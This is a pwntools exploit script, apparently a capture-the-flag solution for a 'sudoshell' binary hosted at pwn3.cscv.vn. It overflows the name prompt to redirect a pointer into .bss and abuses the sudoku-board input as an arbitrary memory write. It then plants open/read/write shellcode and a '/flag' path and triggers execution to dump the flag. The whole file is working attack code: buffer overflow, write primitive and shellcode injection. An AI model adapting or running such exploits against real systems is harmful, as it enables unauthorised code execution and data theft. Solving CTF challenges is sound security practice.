#!/usr/bin/python3
from pwn import *

PATH = "./sudoshell"
HOST = "pwn3.cscv.vn"
PORT = 5555

exe = context.binary = ELF(PATH, checksec=False)
#libc = ELF("libc.so.6") if args.REMOTE  else exe.libc
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = '''
set pagination off
set breakpoint pending on

#b*0x0000000000401BFE
#b*0x0000000000401CE9
b*0x0000000000401C4C

c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    sleep(1)

p = conn()
GDB()

bss1 = exe.bss(400)
bss2 = exe.bss(800)
info(bss1)
info(bss2)
board = 0x4040E0
def writeC(addr, c):
    if c == 0: return
    payload = f"{(addr - board) // 9 + 1} {(addr - board) % 9 + 1} {c}"
    sna(b"> ", payload)

def writeA(addr, a):
    for i in range(len(a)):
        writeC(addr + i, a[i])

shellcode = asm(f'''
        mov rdi, 0x404730
        pop rsi
        pop rdx
        push 0x2
        pop rax
        syscall

        push rax
        pop rdi
        mov rsi, 0x404931
        add dx, 0x70
        pop rax
        nop
        syscall

        mov rax, 0x1
        push 0x1
        pop rdi
        syscall
        ''')

payload = b"A"*0x20 + p64(bss1)[:7]
sna(b"> ", 1)
sa(b"What's your name? ", payload)

writeA(bss1+8, p64(bss2))
writeA(0x404730, b"/flag\0")
writeA(bss2, shellcode)
print(disasm(shellcode))

sla(b"> ", b"0 0 0\n")
p.interactive()
